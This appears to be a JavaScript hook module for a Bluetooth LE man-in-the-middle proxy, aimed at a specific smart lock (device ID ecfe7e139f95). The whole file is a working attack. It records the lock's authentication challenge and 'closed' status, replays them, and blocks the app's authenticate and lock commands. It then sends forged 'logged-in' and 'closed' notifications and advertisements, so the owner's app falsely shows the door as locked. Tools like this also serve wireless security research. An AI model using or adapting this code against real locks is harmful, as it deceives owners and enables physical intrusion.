var fs = require('fs');
var colors = require('colors');
var utils = require('../lib/utils');

var actNotify = false;
var actWrite = '';
var waitForChallenge = false;
var waitForStatus = false;


var interceptedForReplay = {}

var fileToSave='dump/lock'
var interceptedFromFile;


//read the intercepted file content
fs.readFile(fileToSave, function(err,data){
	if (err) { 
//do nothing, the file is not yet
//		throw err 
	} else {
		interceptedFromFile = JSON.parse(data);
	}
});


function customLog(peripheralId, service, characteristic, type, data, eventEmitter, callback){

	console.log('customLog hook');
	var toSave = '';

	switch (type){
		case 'read': toSave +='< R: '; break;
		case 'write': toSave +='> W: '; break;
		case 'notify': toSave +='< N: '; break;
	}
	toSave += characteristic + ' : ' + data.toString('hex') + ' ('+utils.hex2a(data.toString('hex'))+')\n';
  	fs.appendFile("dump/save", toSave, function(err) {
    	if(err) {
    		//send to callback?
        	return console.log(err);
    	}
    //console.log("The file was saved!");
  	}); 

  	callback(null, data);
}


function saveForReplay(peripheralId, service, characteristic, type, data, notifyEmitter, callback){

	datastr = data.toString('hex');

//	console.log('here we are: ' + datastr)

	//the remaining part of challenge
	if (waitForChallenge) {

		interceptedForReplay.challenge2=datastr;
		waitForChallenge = false;
	}

	//the remaining part of status
	if (waitForStatus) {

		interceptedForReplay.status2=datastr;
		waitForStatus=false;

		//save the object to file
	  	fs.writeFile(fileToSave, JSON.stringify(interceptedForReplay), function(err) {
	    	if(err) {
	        	return console.log(err);
	    	}
	    	console.log("The intercepted file saved!");
	  	}); 
	}

	//challenge sent by device
	if (datastr.substring(0,10) === '01140a0500' ) {
		interceptedForReplay.challenge1=datastr;
		//for the next resp
		waitForChallenge = true;
	}

	//status "closed"
	if (datastr.substring(0,10) === '01140a0100' ) {
		interceptedForReplay.status1=datastr;
		//for the next resp
		waitForStatus = true;
	}

	//forward the unchanged notification
	callback(null, data);

}

//returns string with calculated CRC attached
function lockCrc(inputStr){

		res = 0xff;
		inputHex = new Buffer(inputStr,'hex');

		//start from the second byte 
		for (i = 1; i<= inputHex.length; i++) {
			res = res ^ inputHex[i];
		}
		//add padding
		reshex = (res+0x100).toString(16).substr(-2);
//		console.log(reshex);

		return(inputStr+reshex);
}

function lockNotify(peripheralId, service, characteristic, type, data, notifyEmitter, callback){

//	console.log('    lock notify hook'.yellow);
	datastr = data.toString('hex');

	//the remaining part
	if (actNotify) {

		if (interceptedFromFile) {
			datastr = interceptedFromFile.challenge2;
		} else {
			console.log('No file with intercepted data to replay found'.red)
		}

		console.log('    switch challenge cont.'.red);
		actNotify = false;
	}

	if (datastr.substring(0,10) === '01140a0500' ) {
		console.log('    Authentication - switch challenge '.red);

		if (interceptedFromFile) {
			datastr = interceptedFromFile.challenge1;
		} else {
			console.log('No file with intercepted data to replay found'.red)
		}
		//for the next resp
		actNotify = true;
	}

	callback(null, new Buffer(datastr,'hex'));

}


function lockAdvertise(state, notifyEmitter) {
		console.log('Advertisement change : '. red + 'CLOSED'.red.inverse)

		var advertisement = JSON.parse(fs.readFileSync('devices/ecfe7e139f95_LockECFE7E139F95.'+state+'.adv.json', 'utf8'));
		var eir = new Buffer(advertisement.eir,'hex');
		var scanResponse = advertisement.scanResponse ? new Buffer(advertisement.scanResponse, 'hex') : '';
		notifyEmitter.emit('advchange',eir, scanResponse);
}


function lockWrite(peripheralId, service, characteristic, type, data, wsclient, callback){

//	console.log('    lock write hook');
	datastr = data.toString('hex');

	if (actWrite === 'auth') {
		console.log('      Authentication - do not forward to device                                 : '.red + 'XX'.red.inverse);
		actWrite='';
		callback(null,null);

		//notify mobile app "logged-in"
		wsclient.emit('notification', peripheralId, 'da2b84f1627948debdc0afbea0226079', '18cda7844bd3437085bbbfed91ec86af', '01040a0701f7');
	}

	else if (actWrite === 'cmd') {
		console.log('      Command - do not forward to device                                        : '.red + 'XX'.red.inverse);

		callback(null,null);
		
		actWrite='';

		if (interceptedFromFile) {
			wsclient.emit('notification', peripheralId, 'da2b84f1627948debdc0afbea0226079', '18cda7844bd3437085bbbfed91ec86af', interceptedFromFile.status1);
			wsclient.emit('notification', peripheralId, 'da2b84f1627948debdc0afbea0226079', '18cda7844bd3437085bbbfed91ec86af', interceptedFromFile.status2);
		} else {
			console.log('No file with intercepted data to replay found'.red)
		}

		lockAdvertise('closed', wsclient);
	} else if (datastr.substring(0,8) === '01130a06')  { // "authenticate"
		console.log('     Authentication - do not forward to device                                  : '.red + 'XX'.red.inverse);
		actWrite='auth';
		//do not forward this request
		callback(null, null);

	} else if (datastr.substring(0,10) === '01140a0100')  { // "send command"
		console.log('      Command - do not forward to device                                        : '.red + 'XX'.red.inverse);
		actWrite='cmd';
		//do not forward this request
		callback(null, null);

	} else {
		console.log('            lock write hook - forwarding                                        : '.yellow + datastr.yellow.inverse);
		callback(null, data);
	}
}


module.exports.customLog = customLog;
module.exports.saveForReplay = saveForReplay;
module.exports.lockNotify = lockNotify;
module.exports.lockWrite = lockWrite;